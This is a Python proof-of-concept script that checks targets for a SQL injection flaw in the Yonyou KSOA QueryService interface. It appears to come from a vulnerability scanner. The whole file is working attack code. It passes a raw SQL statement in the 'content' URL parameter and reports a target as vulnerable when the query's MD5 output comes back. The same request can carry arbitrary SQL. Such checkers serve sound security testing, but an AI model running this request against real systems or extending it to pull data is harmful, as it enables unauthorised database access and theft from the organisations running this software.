import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA接口com.sksoft.bill.QueryService存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','123456');")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult